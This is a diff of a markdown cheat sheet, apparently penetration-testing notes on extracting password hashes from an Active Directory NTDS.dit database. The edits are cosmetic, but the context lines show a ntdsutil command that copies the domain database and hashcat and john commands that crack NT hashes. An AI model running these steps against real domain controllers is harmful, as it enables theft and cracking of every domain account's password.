@@ -71,11 +71,9 @@ ntdsutil “ac i ntds” “ifm” “create full c:\temp” q q
 ```
 
 - install esdbexport
+  - https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz
 ```
-wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz
-
 sudo apt-get install autoconf automake autopoint libtool pkg-config
-
 ```
 - Dump Tables
 ```
@@ -98,9 +96,8 @@ format options is john, ocl ,ophc
 hashcat -m 1000 output/ntout --username /path/to/wordlist
 
 john –rules=all –fork=2 NT.out
-
 ```
 
 ## Reference 
-https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
-https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/
+- https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
+- https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/
